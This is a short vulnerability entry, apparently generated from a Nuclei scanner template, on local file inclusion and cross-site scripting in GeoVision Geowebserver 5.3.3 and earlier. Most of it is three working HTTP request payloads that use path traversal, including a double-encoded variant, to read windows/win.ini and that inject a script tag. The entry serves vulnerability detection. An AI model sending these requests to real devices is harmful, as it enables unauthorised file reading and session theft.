# Vulnerability: GeoVision Geowebserver <= 5.3.3 - Local File Inclusion / Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`geovision-geowebserver-lfi-xss.yaml`)

## Description
GEOVISION GEOWEBSERVER <= 5.3.3 is vulnerable to several XSS, HTML Injection, and Local File Include (LFI) vectors. The application fails to properly sanitize user requests, allowing injection of HTML code and XSS, as well as client-side exploitation, including session theft.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=<script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

POST /Visitor/bin/WebStrings.srf?obj_name=win.ini HTTP/1.1
Host: {{Hostname}}
Content-Length: 0

GET /Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows\win.ini HTTP/1.1
Host: {{Hostname}}
```

